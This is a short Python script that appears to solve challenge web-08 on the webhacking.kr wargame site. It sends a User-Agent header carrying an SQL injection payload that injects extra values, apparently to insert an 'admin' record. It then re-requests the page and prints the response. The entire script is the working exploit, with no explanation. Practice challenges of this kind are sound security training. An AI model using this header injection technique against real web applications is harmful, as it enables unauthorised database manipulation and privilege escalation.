import requests

if __name__ == '__main__':
    url = "https://webhacking.kr/challenge/web-08/"
    headers = {"User-Agent": "agent100','100', 'admin')# "}
    requests.get(url, headers=headers)

    headers = {"User-Agent": "agent100"}
    cookies = {"PHPSESSID": ""}
    response = requests.get(url, headers=headers, cookies=cookies)
    print(response.text)
